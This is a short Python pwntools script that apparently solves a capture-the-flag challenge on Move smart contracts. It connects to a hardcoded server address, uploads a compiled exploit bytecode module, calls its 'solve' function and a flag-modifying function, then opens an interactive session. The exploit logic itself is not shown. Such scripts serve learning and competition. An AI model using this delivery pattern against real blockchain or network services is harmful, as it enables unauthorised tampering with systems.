from pwn import *
import os
context.log_level = 'debug'

def invoke_function(function, conn):
    conn.recvuntil(b'[SERVER] function to invoke: ')
    conn.send(function)

def main():
    host = "5.161.46.43"
    port = 31340
    
    # Attempt to connect to the TCP server
    conn = remote(host, port)
    print(f"  - Connected to {host}:{port}!")
    
    # Load the solution bytecode
    with open("./solve/build/solution/bytecode_modules/exploit.mv", "rb") as f:
        mod_data = f.read()
    print("  - Loaded solution!")
    
    # Send the solution bytecode to the server
    conn.send(mod_data)
    print("  - Sent solution!")

    # Invoke functions
    invoke_function(b"0x0000000000000000000000000000000000000000000000000000000000001337::flag::modify_value", conn)
    invoke_function(b"0x0000000000000000000000000000000000000000000000000000000000001338::exploit::solve", conn)

    conn.interactive()

if __name__ == "__main__":
    main()
